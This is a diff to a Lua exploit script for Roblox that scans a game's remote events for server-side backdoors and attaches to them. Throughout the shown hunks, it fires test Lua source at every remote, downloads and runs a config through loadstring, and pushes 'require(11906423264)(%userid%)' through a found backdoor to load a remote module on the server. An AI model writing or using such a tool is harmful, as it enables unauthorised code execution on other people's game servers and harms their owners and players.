@@ -2,12 +2,12 @@
 local starterGui = game:GetService("StarterGui")
 -- variables
 local config
-local testSource = [[local daValue=Instance.new("StringValue");daValue.Name,daValue.Parent,daValue.Value=game.PlaceId,workspace,"%s";task.delay(5, daValue.Destroy, daValue)]]
+local testSource = [[local daValue=Instance.new("StringValue");daValue.Name,daValue.Parent,daValue.Value=game.PlaceId,workspace,"%s";task.delay(1, daValue.Destroy, daValue)]]
 local configRaw = (
 	if isfile("bexe-config.lua") then
 		readfile("bexe-config.lua")
 	else
-		game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-scripts-public/main/backdoor-executor/bexe-config.lua")
+		game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/scripts/main/backdoor-executor/bexe-config.lua")
 )
 local scannedRemotes = table.create(0)
 local remoteInfo = {
@@ -113,7 +113,7 @@ local function getStringifiedType(value)
 		if stringifier then
 			stringifier(value)
 		else
-			typeof(value)
+			tostring(value)
 	)
 end
 
@@ -159,7 +159,7 @@ end
 
 local function onAttached(remoteObj, params)
 	if not remoteObj then return end
-	getgenv().__BACKDOOREXEATTACHED = true
+	getgenv().__BEXELUAATTACHED = true
 	print(string.format(msgOutputs.attached, remoteObj:GetFullName(), remoteObj.ClassName))
 	sendNotification("Attached!")
 	initializeRemoteInfo(params or {
@@ -167,13 +167,13 @@ local function onAttached(remoteObj, params)
 	})
 
 	if config.redirectRemote then
-		local newRemote = game:GetService("JointsService"):FindFirstChildWhichIsA("RemoteEvent")
-		if not newRemote or not newRemote:GetAttribute("bexeremote") then
+		local redirectedRemote = game:GetService("JointsService"):FindFirstChildWhichIsA("RemoteEvent")
+		if not redirectedRemote or not redirectedRemote:GetAttribute("bexeremote") then
 			execScript("require(11906423264)(%userid%)")
-			newRemote = game:GetService("JointsService"):WaitForChild("bexe-remote")
+			redirectedRemote = game:GetService("JointsService"):WaitForChild("bexe-remote")
 		end
 
-		remoteInfo.instance = newRemote
+		remoteInfo.instance = redirectedRemote
 		remoteInfo.argSrcIndex = 1
 		remoteInfo.args = {"source"}
 	end
@@ -197,19 +197,18 @@ local function findBackdoors()
 				object.Value ~= ""
 			then
 				onAttached(pathToInstance(object.Value))
+				connection:Disconnect()
 			end
 		end)
 	end
 
-	for _, object in getRemotes() do
+	for _, object in getRemotes() do task.wait()
 		if remoteInfo.foundBackdoor then break end
 		local remoteFunc, objectPath = getRemoteFunc(object), object:GetFullName()
 
 		print(string.format(msgOutputs.printRemote, object:GetFullName(), object.ClassName))
 		pcall(task.spawn, remoteFunc, object, string.format(testSource, objectPath))
-
 		table.insert(scannedRemotes, objectPath)
-		task.wait()
 	end
 	table.clear(scannedRemotes)
 	connection:Disconnect()
@@ -223,7 +222,7 @@ do -- "initialization"?
 
 		if (not succ) then
 			warn(msgOutputs.configCantLoad)
-			configRaw = game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-scripts-public/main/backdoor-executor/bexe-config.lua")
+			configRaw = game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/scripts/main/backdoor-executor/bexe-config.lua")
 
 			writefile("bexe-config.lua", configRaw)
 			loadedConfig = loadstring(configRaw)()
@@ -234,7 +233,7 @@ do -- "initialization"?
 	end
 end
 do -- backdoor finding
-	if not getgenv().__BACKDOOREXEATTACHED then
+	if not getgenv().__BEXELUAATTACHED then
 		sendNotification("Press F9 to see the remotes being scanned.")
 		local placeCacheData = if (typeof(config) == "table" and config.cachedPlaces) then config.cachedPlaces[game.PlaceId] else nil
 
